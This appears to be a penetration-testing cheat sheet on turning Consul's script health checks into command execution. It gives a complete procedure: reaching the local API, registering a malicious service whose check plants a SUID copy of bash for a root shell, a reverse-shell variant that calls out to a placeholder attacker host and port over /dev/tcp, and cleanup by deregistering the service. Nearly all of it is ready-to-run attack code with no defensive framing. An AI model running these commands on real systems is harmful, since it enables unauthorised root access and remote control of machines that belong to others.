# Consul Service Health-Check RCE

When Consul runs with `enable_script_checks=true` and `acl_default_policy=allow` (common defaults), registering a service with a health check runs arbitrary commands as the Consul process (often root).

Check if Consul API is accessible (usually `127.0.0.1:8500` — tunnel in via SSH or chisel):
```bash
curl http://127.0.0.1:8500/v1/agent/services    # list registered services
consul version                                   # if consul binary is on-target
```

Register a service with a malicious health check:
```bash
cat > /dev/shm/evil.json << 'EOF'
{
  "Name": "evil",
  "ID": "evil-svc",
  "Port": 0,
  "Check": {
      "args": ["bash", "-c", "cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash"],
      "interval": "30s",
      "timeout": "5s"
  }
}
EOF
curl -X PUT http://127.0.0.1:8500/v1/agent/service/register -H "Content-Type: application/json" -d @/dev/shm/evil.json
# Wait ≤30s for the health check to fire
/tmp/rootbash -p   # root shell via SUID bash
```

For a reverse shell instead: `"args": ["bash", "-c", "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"]`

Deregister after use: `curl -X PUT http://127.0.0.1:8500/v1/agent/service/deregister/evil-svc`
